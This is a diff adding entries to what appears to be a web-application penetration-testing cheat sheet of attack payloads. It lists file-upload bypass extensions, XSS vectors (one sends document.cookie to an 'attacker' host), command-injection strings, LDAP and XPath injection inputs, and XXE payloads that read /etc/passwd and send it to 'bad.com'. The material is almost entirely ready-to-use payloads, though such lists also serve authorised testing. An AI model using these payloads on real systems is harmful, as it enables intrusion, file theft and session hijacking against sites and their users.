@@ -59,6 +59,8 @@ File uploads
 .php5%00.jpeg*
     Different file formats
     *https://en.wikipedia.org/wiki/List_of_file_signatures*
+    Different extensions
+    *.php .php3 .php4 .php5*
 PHP
     You can usually bypass file include filters with payloads like:
     *php://filter/convert.base64-encode/resource=file*
@@ -82,6 +84,40 @@ XSS vectors
     *<iframe src="http://attacker/" height="0" width="0"></iframe>*
     Steal cookies
     *<script> new Image().src="http://attacker/bogus.php?output="+document.cookie; </script>*
+    Payload no space
+    *<svg/onload=alert(1)>*
+
+command injection
+    *`id`
+| id
+&& id
+error || id
+%0a id
+time based
+sleep 10*
+
+LDAP injection
+    *)
+foo)
+((cn=*)
+(|(cn=[INPUT1])(cn=[INPUT2]))
+(&(cn=[INPUT1])(userPassword=[INPUT2]))*
+    Try wildcard ***** or partial match **a***, **ad***..
+
+
+ XPath injection
+    *' and '1'='1
+' or '1'='0
+' and '1'='0
+' or '1'='1
+foo']%00
+foo' or 1=1]%00
+'%20or%201=1]/child::node()%00*
+
+classic xxe
+    *<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" > <!ENTITY callhome SYSTEM "bad.com/?%xxe;"> ] > <foo>&xxe;&callhome;</foo>*
+    *<?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" > ] > <foo>&xxe;</foo>*
+
 
 RFI/LFI
     Test it:
